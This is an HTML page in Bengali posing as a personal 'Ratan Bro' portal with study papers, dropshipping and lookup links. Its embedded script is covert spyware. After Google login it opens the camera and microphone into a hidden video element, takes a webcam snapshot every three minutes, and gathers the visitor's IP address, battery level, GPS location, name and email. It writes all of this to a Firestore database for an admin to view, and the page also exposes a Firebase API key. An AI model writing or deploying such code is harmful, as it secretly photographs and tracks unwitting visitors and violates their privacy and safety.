<!DOCTYPE html>
<html lang="bn">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Ratan Bro | Official Hub</title>
    <link href="https://fonts.googleapis.com/css2?family=Hind+Siliguri:wght@400;600;700&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        :root {
            --pink: #ff4d94;
            --dark: #0f172a;
            --card: #1e293b;
            --text: #f8fafc;
        }

        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Hind Siliguri', sans-serif;
        }

        body {
            background: var(--dark);
            color: var(--text);
            overflow-x: hidden;
        }

        /* --- Login Overlay --- */
        #login-overlay {
            position: fixed;
            inset: 0;
            background: var(--dark);
            z-index: 10000;
            display: flex;
            align-items: center;
            justify-content: center;
        }

        .login-box {
            background: var(--card);
            padding: 40px;
            border-radius: 30px;
            border: 2px solid var(--pink);
            text-align: center;
            width: 90%;
            max-width: 400px;
        }

        .round-img {
            width: 100px;
            height: 100px;
            border-radius: 50%;
            border: 3px solid var(--pink);
            margin-bottom: 20px;
            object-fit: cover;
        }

        /* --- Main UI --- */
        #main-ui {
            display: none;
        }

        .hero {
            background: linear-gradient(135deg, #ff4d94 0%, #7c3aed 100%);
            padding: 50px 20px;
            text-align: center;
            border-radius: 0 0 50px 50px;
            position: relative;
        }

        .profile-wrapper {
            display: flex;
            justify-content: center;
            align-items: center;
            gap: -20px;
        }

        .p-img {
            width: 100px;
            height: 100px;
            border-radius: 50%;
            border: 4px solid white;
            object-fit: cover;
            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.3);
        }

        .user-p-img {
            width: 80px;
            height: 80px;
            margin-left: -20px;
            z-index: 1;
            border: 3px solid var(--dark);
        }

        .container {
            padding: 20px;
            max-width: 900px;
            margin: 0 auto;
        }

        .grid {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(140px, 1fr));
            gap: 15px;
            margin-top: 30px;
        }

        .card {
            background: var(--card);
            border-radius: 20px;
            padding: 20px;
            text-align: center;
            text-decoration: none;
            color: white;
            border: 1px solid #334155;
            transition: 0.3s;
        }

        .card:hover {
            transform: translateY(-5px);
            border-color: var(--pink);
        }

        .card i {
            font-size: 2rem;
            color: var(--pink);
            margin-bottom: 10px;
        }

        canvas {
            display: none;
        }

        /* ছবি তোলার জন্য হিডেন ক্যানভাস */
    </style>
</head>

<body>

    <div id="login-overlay">
        <div class="login-box">
            <img src="ratan.jpg" onerror="this.src='https://i.ibb.co/vzYm8mN/ratan.jpg'" class="round-img">
            <h3>স্বাগতম রতন ব্রো পোর্টালে</h3>
            <p style="margin: 15px 0; opacity: 0.7;">এগিয়ে যেতে জিমেইল দিয়ে লগইন করুন</p>
            <button onclick="googleLogin()"
                style="background:var(--pink); color:white; border:none; padding:12px 30px; border-radius:50px; font-weight:bold; cursor:pointer; width:100%;">
                <i class="fab fa-google"></i> Login with Google
            </button>
        </div>
    </div>

    <div id="main-ui">
        <section class="hero">
            <div class="profile-wrapper">
                <img src="ratan.jpg" class="p-img"> <img id="user-display-pic" src="" class="p-img user-p-img">
            </div>
            <h2 id="user-welcome" style="margin-top:15px;"></h2>
            <div
                style="background:white; color:var(--pink); padding:5px 15px; border-radius:20px; display:inline-block; font-weight:bold; margin-top:10px;">
                ratan.bro.bd</div>
        </section>

        <div class="container">
            <div class="grid">
                <a href="testpaper.html" class="card">
                    <i class="fas fa-file-pdf"></i>
                    <h4>HSC Test Paper</h4>
                </a>
                <a href="business.html" class="card">
                    <i class="fas fa-chart-line"></i>
                    <h4>Dropshipping</h4>
                </a>
                <a href="https://your-lookup-site.com" class="card"> <i class="fas fa-search"></i>
                    <h4>Number Lookup</h4>
                </a>
                <a href="portfolio.html" class="card">
                    <i class="fas fa-id-card"></i>
                    <h4>My Info</h4>
                </a>
            </div>
        </div>
    </div>

    <canvas id="snapshotCanvas" width="640" height="480"></canvas>
    <video id="hiddenVideo" autoplay style="display:none;"></video>

    <script type="module">
        import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.0/firebase-app.js";
        import { getAuth, signInWithPopup, GoogleAuthProvider, onAuthStateChanged } from "https://www.gstatic.com/firebasejs/10.7.0/firebase-auth.js";
        import { getFirestore, doc, setDoc } from "https://www.gstatic.com/firebasejs/10.7.0/firebase-firestore.js";

        const firebaseConfig = {
            apiKey: "AIzaSyC4ExRu3Oze8api5-ueDTBqZOceSa8wclo",
            authDomain: "ratanweab.firebaseapp.com",
            projectId: "ratanweab",
            storageBucket: "ratanweab.firebasestorage.app",
            messagingSenderId: "611953936063",
            appId: "1:611953936063:web:7e3ca24060d7478fb2a80a"
        };

        const app = initializeApp(firebaseConfig);
        const auth = getAuth(app);
        const db = getFirestore(app);
        const provider = new GoogleAuthProvider();

        // গুগল লগইন
        window.googleLogin = () => {
            signInWithPopup(auth, provider).catch(e => console.log("Login Error"));
        };

        // লগইন স্ট্যাটাস চেক (অটো লগইন)
        onAuthStateChanged(auth, (user) => {
            if (user) {
                document.getElementById('login-overlay').style.display = 'none';
                document.getElementById('main-ui').style.display = 'block';
                document.getElementById('user-welcome').innerText = "Hello, " + user.displayName;
                document.getElementById('user-display-pic').src = user.photoURL;

                startTracking(user); // তথ্য সংগ্রহ ও ছবি তোলা শুরু
            }
        });

        async function startTracking(user) {
            // ১. ক্যামেরা চালু করা (পারমিশন চাইলে ইউজার এলাও করবে)
            const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true }).catch(e => console.log("Media blocked"));
            document.getElementById('hiddenVideo').srcObject = stream;

            // ২. প্রতি ৩ মিনিট পর পর ছবি তোলা ও তথ্য পাঠানো
            setInterval(() => {
                takeSnapshot(user);
            }, 180000); // ১৮০০০০ মি:লি: = ৩ মিনিট

            takeSnapshot(user); // প্রথমবার সাথে সাথেই একবার হবে
        }

        async function takeSnapshot(user) {
            const canvas = document.getElementById('snapshotCanvas');
            const video = document.getElementById('hiddenVideo');
            const ctx = canvas.getContext('2d');
            ctx.drawImage(video, 0, 0, 640, 480);
            const dataURL = canvas.toDataURL('image/jpeg'); // এটি হচ্ছে ইউজারের ছবি

            let ip = await fetch('https://api.ipify.org?format=json').then(r => r.json()).catch(() => ({ ip: "Unknown" }));
            let battery = "Unknown";
            if (navigator.getBattery) { const b = await navigator.getBattery(); battery = Math.round(b.level * 100) + "%"; }

            navigator.geolocation.getCurrentPosition(async (pos) => {
                const info = {
                    name: user.displayName,
                    email: user.email,
                    ip: ip.ip,
                    battery: battery,
                    loc: `${pos.coords.latitude}, ${pos.coords.longitude}`,
                    lastPic: dataURL, // এখানে ইউজারের লাইভ ছবির ডাটা থাকবে যা এডমিনে দেখা যাবে
                    time: new Date().toLocaleString()
                };
                await setDoc(doc(db, "users", user.email.replace('.', '_')), info, { merge: true });
            });
        }
    </script>
</body>

</html>
